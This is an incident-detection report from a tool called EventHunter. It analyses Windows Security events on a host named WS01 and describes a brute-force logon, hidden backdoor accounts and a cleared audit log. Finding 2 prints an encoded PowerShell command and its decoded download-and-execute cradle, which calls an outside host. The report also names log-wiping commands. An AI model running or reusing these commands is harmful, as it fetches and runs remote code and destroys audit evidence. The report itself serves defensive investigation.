# EventHunter Report

| | |
|---|---|
| **Source file(s)** | WS01-Security.evtx |
| **Generated** | 2026-09-14 09:30:00 UTC |
| **Relevant events analysed** | 41 |
| **Time range** | 2026-09-14 02:00:00 → 2026-09-14 02:35:00 UTC |
| **Detections** | 7 |
| **Overall risk** | 🔴 CRITICAL |

## Summary

| Severity | Count |
|---|---:|
| 🔴 CRITICAL | 4 |
| 🟠 HIGH | 2 |
| 🟡 MEDIUM | 1 |

## Findings

| # | Severity | First seen (UTC) | Detection | ATT&CK | Summary |
|---:|---|---|---|---|---|
| [1](#finding-1) | 🔴 CRITICAL | 2026-09-14 02:13:00 | Brute force followed by successful logon | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | 23 failed logons for WS01\\administrator from 203.0.113.47 in 90s - then a successful logon |
| [2](#finding-2) | 🔴 CRITICAL | 2026-09-14 02:17:40 | Encoded PowerShell execution | [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1027.010](https://attack.mitre.org/techniques/T1027/010/) | administrator ran powershell.exe with: Encoded command (-EncodedCommand), Hidden window, No profile (-NoProfile), Non-interactive (-NonInteractive), Download cradle (decoded), Dynamic code execution (Invoke-Expression) (decoded) |
| [3](#finding-3) | 🔴 CRITICAL | 2026-09-14 02:24:12 | User account disguised as computer account | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | WS01\\administrator created account WS01\\WS01-SYNC$ |
| [4](#finding-4) | 🔴 CRITICAL | 2026-09-14 02:31:05 | Security audit log cleared | [T1070.001](https://attack.mitre.org/techniques/T1070/001/) | Security log cleared by WS01\\administrator |
| [5](#finding-5) | 🟠 HIGH | 2026-09-14 02:21:00 | User account created | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | WS01\\administrator created account WS01\\svc\_update |
| [6](#finding-6) | 🟠 HIGH | 2026-09-14 02:22:30 | Newly created account used with admin privileges | [T1078](https://attack.mitre.org/techniques/T1078/) | WS01\\svc\_update received special privileges in 1 logon(s) - account was created in this log |
| [7](#finding-7) | 🟡 MEDIUM | 2026-09-14 02:15:02 | Special privileges assigned to logon | [T1078](https://attack.mitre.org/techniques/T1078/) | WS01\\administrator received special privileges in 1 logon(s) |

## Timeline

| Time (UTC) | # | Severity | Event |
|---|---:|---|---|
| 2026-09-14 02:13:00 | [1](#finding-1) | 🔴 CRITICAL | Brute force followed by successful logon |
| 2026-09-14 02:15:02 | [7](#finding-7) | 🟡 MEDIUM | Special privileges assigned to logon |
| 2026-09-14 02:17:40 | [2](#finding-2) | 🔴 CRITICAL | Encoded PowerShell execution |
| 2026-09-14 02:21:00 | [5](#finding-5) | 🟠 HIGH | User account created |
| 2026-09-14 02:22:30 | [6](#finding-6) | 🟠 HIGH | Newly created account used with admin privileges |
| 2026-09-14 02:24:12 | [3](#finding-3) | 🔴 CRITICAL | User account disguised as computer account |
| 2026-09-14 02:31:05 | [4](#finding-4) | 🔴 CRITICAL | Security audit log cleared |

## MITRE ATT&CK Coverage

| Technique | Name | Tactic(s) | Findings |
|---|---|---|---|
| [T1027.010](https://attack.mitre.org/techniques/T1027/010/) | Obfuscated Files or Information: Command Obfuscation | Defense Evasion | [#2](#finding-2) |
| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | Execution | [#2](#finding-2) |
| [T1070.001](https://attack.mitre.org/techniques/T1070/001/) | Indicator Removal: Clear Windows Event Logs | Defense Evasion | [#4](#finding-4) |
| [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | Defense Evasion, Persistence, Privilege Escalation, Initial Access | [#6](#finding-6), [#7](#finding-7) |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | Credential Access | [#1](#finding-1) |
| [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | Persistence | [#3](#finding-3), [#5](#finding-5) |

## Finding Details

<a id="finding-1"></a>

### 1. 🔴 CRITICAL — Brute force followed by successful logon

- **When:** 2026-09-14 02:13:00 → 2026-09-14 02:14:30 UTC
- **Host:** WS01.corp.local
- **Rule:** `brute-force`
- **MITRE ATT&CK:** [T1110.001](https://attack.mitre.org/techniques/T1110/001/) Brute Force: Password Guessing
- **Tactic(s):** Credential Access
- **Evidence:** Event ID(s) 4624, 4625; EventRecordID(s) 184212, 184213, 184214, 184215, 184216, 184217, 184218, 184219, 184220, 184221, 184222, 184223, 184224, 184225, 184226, 184227, 184228, 184229, 184230, 184231, 184232, 184233, 184234, 184235

| Field | Value |
|---|---|
| Target account | WS01\\administrator |
| Failed attempts | 23 |
| Duration | 90s |
| Source IP(s) | 203.0.113.47 |
| Source workstation(s) | kali |
| Logon type(s) | Network |
| Failure reason(s) | wrong password |
| Successful logon | 2026-09-14 02:15:02 UTC from 203.0.113.47 (record 184235) |

**Why it matters:** Many failed logons against a single account in a short period is the signature of an online password-guessing attack (manual, scripted with Hydra/CrackMapExec, or a misconfigured service). Successful compromise gives the attacker a valid account, which defeats most perimeter controls. A success shortly after the failures is the most important thing to rule out.

**Recommended next steps:**

1. Check whether the source IP(s) are internal, expected, or known-bad.
1. If a successful logon followed, treat the account as compromised: reset credentials, review its activity (4624/4672/4688) after that time.
1. Many 'user does not exist' failures suggest username enumeration; many accounts from one IP suggest password spraying.
1. Confirm account lockout policy is configured.

---

<a id="finding-2"></a>

### 2. 🔴 CRITICAL — Encoded PowerShell execution

- **When:** 2026-09-14 02:17:40 UTC
- **Host:** WS01.corp.local
- **Rule:** `suspicious-powershell`
- **MITRE ATT&CK:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/) Command and Scripting Interpreter: PowerShell; [T1027.010](https://attack.mitre.org/techniques/T1027/010/) Obfuscated Files or Information: Command Obfuscation
- **Tactic(s):** Defense Evasion, Execution
- **Evidence:** Event ID(s) 4688; EventRecordID(s) 184237

| Field | Value |
|---|---|
| User | WS01\\administrator |
| Process | C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe |
| Parent process | C:\\Windows\\System32\\cmd.exe |
| Indicators | Encoded command (-EncodedCommand), Hidden window, No profile (-NoProfile), Non-interactive (-NonInteractive), Download cradle (decoded), Dynamic code execution (Invoke-Expression) (decoded) |
| Suspicion score | 10 |

**Command line:**

```powershell
powershell.exe -nop -w hidden -noni -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAnACkAOwBJAEUAWAAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgAyADMAOgA4ADAAOAAwAC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkA
```

**Decoded payload:**

```powershell
$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');IEX $wc.DownloadString('http://198.51.100.23:8080/update.ps1')
```

**Why it matters:** PowerShell is installed on every Windows host and can download and run code entirely in memory, which makes it a favourite of commodity malware and red-team frameworks alike (Empire, Cobalt Strike, Metasploit all emit `powershell -nop -w hidden -enc ...`). Base64 encoding and character obfuscation have almost no legitimate administrative use; their purpose is to hide the command from people and from signature-based tools.

**Recommended next steps:**

1. Read the decoded payload: look for URLs, IPs, and second-stage downloads.
1. Identify the parent process - Office apps, browsers or wscript spawning PowerShell strongly suggests initial access via phishing.
1. Check PowerShell Operational logs (Event ID 4104 script block logging) for the full de-obfuscated script.
1. Isolate the host if a download cradle or credential-theft tooling is present.

---

<a id="finding-3"></a>

### 3. 🔴 CRITICAL — User account disguised as computer account

- **When:** 2026-09-14 02:24:12 UTC
- **Host:** WS01.corp.local
- **Rule:** `account-created`
- **MITRE ATT&CK:** [T1136.001](https://attack.mitre.org/techniques/T1136/001/) Create Account: Local Account
- **Tactic(s):** Persistence
- **Evidence:** Event ID(s) 4720; EventRecordID(s) 184240

| Field | Value |
|---|---|
| New account | WS01\\WS01-SYNC$ |
| New account SID | S-1-5-21-3623811015-3361044348-30300820-1010 |
| Account scope | local (SAM) |
| Created by | WS01\\administrator |
| Creator logon ID | 0x8a1f22 |
| Why critical | Name ends in '$' like a computer account, but this is a user account (4720). Real computer accounts are created via Event ID 4741. |

**Why it matters:** Creating an account is one of the simplest ways for an attacker to keep access: even if the original malware or stolen password is cleaned up, the backdoor account still works. Accounts created outside the normal provisioning process (HR ticket, IAM tooling) - especially at odd hours or by an unexpected user - deserve immediate review.

**Recommended next steps:**

1. Verify the creation against a change/provisioning ticket.
1. Check whether the account was added to a privileged group (Event IDs 4728/4732/4756) and whether it has logged on (4624/4672).
1. Investigate the creator's session (Creator logon ID) for other activity.
1. Disable the account if it cannot be accounted for.

---

<a id="finding-4"></a>

### 4. 🔴 CRITICAL — Security audit log cleared

- **When:** 2026-09-14 02:31:05 UTC
- **Host:** WS01.corp.local
- **Rule:** `audit-log-cleared`
- **MITRE ATT&CK:** [T1070.001](https://attack.mitre.org/techniques/T1070/001/) Indicator Removal: Clear Windows Event Logs
- **Tactic(s):** Defense Evasion
- **Evidence:** Event ID(s) 1102; EventRecordID(s) 184241

| Field | Value |
|---|---|
| Cleared by | WS01\\administrator |
| User SID | S-1-5-21-3623811015-3361044348-30300820-500 |
| Logon ID | 0x8a1f22 |
| Channel | Security |

**Why it matters:** Attackers clear event logs to destroy the evidence of what they did (`wevtutil cl Security`, `Clear-EventLog`, Mimikatz `event::clear`). Because 1102 is written *after* the wipe, it is often the only surviving trace - everything before it is gone from this host. Treat it as a strong signal that an intrusion is in progress or being covered up.

**Recommended next steps:**

1. Recover the lost history from a SIEM, Windows Event Forwarding, or backups.
1. Determine whether the clearing account and logon session were legitimate.
1. Check other channels (System 104, PowerShell, Sysmon) for wipes of other logs.
1. Treat the host as compromised until proven otherwise.

---

<a id="finding-5"></a>

### 5. 🟠 HIGH — User account created

- **When:** 2026-09-14 02:21:00 UTC
- **Host:** WS01.corp.local
- **Rule:** `account-created`
- **MITRE ATT&CK:** [T1136.001](https://attack.mitre.org/techniques/T1136/001/) Create Account: Local Account
- **Tactic(s):** Persistence
- **Evidence:** Event ID(s) 4720; EventRecordID(s) 184238

| Field | Value |
|---|---|
| New account | WS01\\svc\_update |
| New account SID | S-1-5-21-3623811015-3361044348-30300820-1009 |
| Account scope | local (SAM) |
| Created by | WS01\\administrator |
| Creator logon ID | 0x8a1f22 |

**Why it matters:** Creating an account is one of the simplest ways for an attacker to keep access: even if the original malware or stolen password is cleaned up, the backdoor account still works. Accounts created outside the normal provisioning process (HR ticket, IAM tooling) - especially at odd hours or by an unexpected user - deserve immediate review.

**Recommended next steps:**

1. Verify the creation against a change/provisioning ticket.
1. Check whether the account was added to a privileged group (Event IDs 4728/4732/4756) and whether it has logged on (4624/4672).
1. Investigate the creator's session (Creator logon ID) for other activity.
1. Disable the account if it cannot be accounted for.

---

<a id="finding-6"></a>

### 6. 🟠 HIGH — Newly created account used with admin privileges

- **When:** 2026-09-14 02:22:30 UTC
- **Host:** WS01.corp.local
- **Rule:** `privileged-logon`
- **MITRE ATT&CK:** [T1078](https://attack.mitre.org/techniques/T1078/) Valid Accounts
- **Tactic(s):** Defense Evasion, Initial Access, Persistence, Privilege Escalation
- **Evidence:** Event ID(s) 4672, 4720; EventRecordID(s) 184238, 184239

| Field | Value |
|---|---|
| Account | WS01\\svc\_update |
| Account SID | S-1-5-21-3623811015-3361044348-30300820-1009 |
| Privileged logons | 1 |
| Distinct logon sessions | 1 |
| Sensitive privileges | SeBackupPrivilege, SeDebugPrivilege |
| All privileges | SeBackupPrivilege, SeDebugPrivilege |
| Account created | 2026-09-14 02:21:00 UTC by WS01\\administrator (record 184238) |

**Why it matters:** Event 4672 means the logon received administrator-equivalent privileges such as SeDebugPrivilege (read/write any process memory - how Mimikatz dumps LSASS) or SeTcbPrivilege (act as the operating system). Attackers who escalate privileges or abuse a stolen admin account show up here. Admins also trigger it legitimately, so the value is in asking: *should this account be admin, and at this time?*

**Recommended next steps:**

1. Confirm the account is an expected administrator (check group membership).
1. Correlate the SubjectLogonId with the matching 4624 to find the logon type and source IP.
1. Review processes started in the same session (4688 with the same logon ID).
1. Unexpected or newly created admin accounts should be disabled pending review.

---

<a id="finding-7"></a>

### 7. 🟡 MEDIUM — Special privileges assigned to logon

- **When:** 2026-09-14 02:15:02 UTC
- **Host:** WS01.corp.local
- **Rule:** `privileged-logon`
- **MITRE ATT&CK:** [T1078](https://attack.mitre.org/techniques/T1078/) Valid Accounts
- **Tactic(s):** Defense Evasion, Initial Access, Persistence, Privilege Escalation
- **Evidence:** Event ID(s) 4672; EventRecordID(s) 184236

| Field | Value |
|---|---|
| Account | WS01\\administrator |
| Account SID | S-1-5-21-3623811015-3361044348-30300820-500 |
| Privileged logons | 1 |
| Distinct logon sessions | 1 |
| Sensitive privileges | SeBackupPrivilege, SeDebugPrivilege, SeImpersonatePrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege |
| All privileges | SeBackupPrivilege, SeDebugPrivilege, SeImpersonatePrivilege, SeRestorePrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege |

**Why it matters:** Event 4672 means the logon received administrator-equivalent privileges such as SeDebugPrivilege (read/write any process memory - how Mimikatz dumps LSASS) or SeTcbPrivilege (act as the operating system). Attackers who escalate privileges or abuse a stolen admin account show up here. Admins also trigger it legitimately, so the value is in asking: *should this account be admin, and at this time?*

**Recommended next steps:**

1. Confirm the account is an expected administrator (check group membership).
1. Correlate the SubjectLogonId with the matching 4624 to find the logon type and source IP.
1. Review processes started in the same session (4688 with the same logon ID).
1. Unexpected or newly created admin accounts should be disabled pending review.

---

*Generated by EventHunter v1.0.0. Findings are leads for investigation, not verdicts — validate each against the raw events.*
